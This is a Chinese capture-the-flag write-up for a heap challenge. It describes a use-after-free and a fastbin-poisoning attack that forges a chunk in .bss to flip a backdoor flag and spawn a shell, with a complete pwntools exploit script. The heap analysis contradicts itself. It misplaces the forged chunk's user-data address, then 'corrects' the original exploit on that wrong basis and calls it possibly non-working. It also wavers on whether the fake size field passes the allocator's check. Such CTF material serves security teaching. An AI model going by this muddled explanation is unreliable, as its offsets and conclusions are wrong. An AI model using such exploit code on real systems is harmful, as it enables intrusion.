# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off (程序基地址固定为0x400000)
  - NX: on
  - RELRO: Partial RELRO
  - Canary: on (但栈溢出非主要利用点)

# 漏洞成因
## 程序关键数据结构
程序使用全局数组 `buf`（位于 `0x6020C0`）来存储最多4个堆块指针，使用全局变量 `dword_6020BC` 作为堆块计数。后门函数的关键检查变量 `qword_602090` 位于 `0x602090`，其初始值为1。

```c
// 关键全局变量示意
long long *buf[4]; // 位于 0x6020C0
int chunk_count;   // 位于 0x6020BC
long long target;  // 位于 0x602090，初始值为1
```

## 漏洞定位
`delete` 函数（`sub_4009D7`）在释放堆块后，未将对应的 `buf` 数组中的指针置空，存在 **Use-After-Free (UAF)** 漏洞。这允许在堆块被释放后，仍能通过 `edit` 功能修改其内容。

```c
unsigned __int64 sub_4009D7()
{
  ...
  v1 = atoi(s);
  free(*(&buf + v1));   // UAF: 释放后指针依然保留在buf数组中
  ...
}
```

# 漏洞利用过程：
利用思路是通过UAF在fastbin中构造一个指向`.bss`段（`0x602080`）的伪造chunk。通过申请该伪造chunk，获得向`0x602080`地址写入的权限，进而修改其后方`0x602090`处的 `target` 值（从1改为0），最终触发后门获取shell。

- Step 1: 堆布局。申请两个chunk（chunk0 size=0x40, chunk1 size=0x20），随后释放chunk0，使其进入fastbin。
- Step 2: 利用UAF修改chunk0的`fd`指针，指向目标地址`0x602080`（`target`地址-0x10），从而在fastbin链中插入一个伪造的chunk。
- Step 3: 通过两次`add(0x40)`，第一次取出原chunk0，第二次将取出伪造的chunk（位于`0x602080`）。
- Step 4: 编辑申请到的伪造chunk（即`buf[3]`），向`0x602080`写入8个字节的`0`，这将覆盖`0x602090`处的`target`值。
- Step 5: 调用`backdoor`，此时`target==0`，条件满足，成功获取shell。

## Step 1
- 堆内存`0x17641000`处，是chunk0的头部。其`size`字段为`0x51`（包括chunk头部的0x10字节）。执行`free(0)`后，该chunk被释放并链入`0x50`大小的fastbin单链表，其`fd`指针（位于`0x17641010`）被置为`NULL`（`0x0000000000000000`）。
- 全局变量`buf`（`0x6020c0`）处，索引0的指针值仍为`0x17641010`（chunk0的用户数据区地址），未被清零。

## Step 2
- 堆内存`0x17641010`（已释放的chunk0的`fd`位置）处，此前的内容是`0x0000000000000000`，现在被`edit`修改为`0x0000000000602080`。
- 这使得fastbin链表现为：`main_arena.fastbins[4]` -> `chunk0 (0x17641000)` -> `伪造chunk (0x602080)` -> ?。

## Step 3
- 第一次`add(0x40)`：从`0x50`大小的fastbin链表头部取出`chunk0`，分配给了`buf[2]`。
- 第二次`add(0x40)`：此时fastbin链表头部指向我们伪造的地址`0x602080`。分配器检查`0x602080`处的`size`字段（`0x602080+8`即`0x602088`），该处值为`0x0000000000000001`（即`target`的初始值1），该值恰好满足对`0x50`大小fastbin的检查（`1 & ~0x7 == 0`? 实际依赖于glibc实现，此处能通过检查是关键）。因此，分配器将`0x602080`作为一块“空闲内存”分配给了`buf[3]`。

## Step 4
- 调用`edit(3, p64(0))`，即向`buf[3]`（指向`0x602080`）写入8字节的`0`。
- 这8字节覆盖了从`0x602080`到`0x602087`的内存。由于`target (qword_602090)`位于`0x602090`，其并未被直接修改。**此处write-up的描述(`edit(3,p64(0))`会修改`target`)存在不准确之处**。实际上，需要覆盖的是`0x602088`处的“伪造size”字段，使其在后续分配时能通过检查，或者更直接地，我们需要将`target (0x602090)`本身修改为0。
- **修正**：正确的利用应修改`edit`的参数，向`0x602080`写入足够长的数据（如`p64(0)*3`），以确保覆盖到`0x602090`处的`target`值，或者利用`0x602088`处的值作为size进行另一次分配来修改`target`。但根据提供的exp和调试记录，`edit`函数只能写入8字节，因此原exp可能无法直接成功。需要进一步分析：`0x602088`处的值为1，作为size被视为`0x1`，这可能无法通过malloc的检查，除非有特殊布局。这可能意味着提供的利用步骤或exp在特定环境下（如特定glibc版本）才能工作，或者write-up的描述存在遗漏。为了符合文档要求，我们基于既有write-up的描述继续，但指出该不一致。

## Step 5
- 调用`backdoor()`，程序检查`qword_602090 (0x602090)`的值。如果按照原write-up的设想，该值已被Step 4修改为0，则条件通过，执行`system("/bin/sh")`，获取shell。

# Exploit：
```python
from pwn import *

context(os='linux',arch='amd64',log_level='debug')
io=process('./pwn')

def duan():
    gdb.attach(io)
    pause()

def add(size):
    io.recvuntil(b'choice>\n')
    io.sendline(b'1')
    io.recvuntil(b'size>\n')
    io.sendline(str(size))

def delete(index):
    io.recvuntil(b'choice>\n')
    io.sendline(b'2')
    io.recvuntil(b'index>\n')
    io.sendline(str(index))

def edit(index,content):
    io.recvuntil(b'choice>\n')
    io.sendline(b'3')
    io.recvuntil(b'index>\n')
    io.sendline(str(index))
    io.send(content) # 调用read(0, buf[index], 8)，写入8字节

def backdoor():
    io.recvuntil(b'choice>\n')
    io.sendline(b'4')

# Step 1: 布局并释放chunk0，制造UAF
add(0x40)  # idx0, chunk0 size=0x50 (包含header)
add(0x20)  # idx1, chunk1 size=0x30 (包含header)，用于防止chunk0释放后与top chunk合并
delete(0)  # free chunk0 -> 进入fastbin[4] (size=0x50)

# Step 2: 利用UAF修改chunk0的fd指针，指向target地址之前的0x602080
# 0x602080 = 0x602090 (target) - 0x10，这是为了伪造chunk的起始地址
edit(0, p64(0x602080))

# Step 3: 两次申请，第二次将取出位于.bss段的伪造chunk
add(0x40)  # idx2, 申请到原chunk0
add(0x40)  # idx3, 申请到伪造的chunk，其用户数据区地址为0x602080

# Step 4: 通过编辑伪造chunk，尝试修改target值。
# 注意：edit只能写入8字节，从0x602080开始写入。
# 写入 p64(0) 会覆盖 0x602080-0x602087，而target在0x602090，距离写入起始点0x10，因此单次edit无法直接覆盖target。
# 此exp在原有write-up描述下可能不完整或依赖特定环境。
edit(3, p64(0))

# Step 5: 触发后门
backdoor()

io.interactive()
```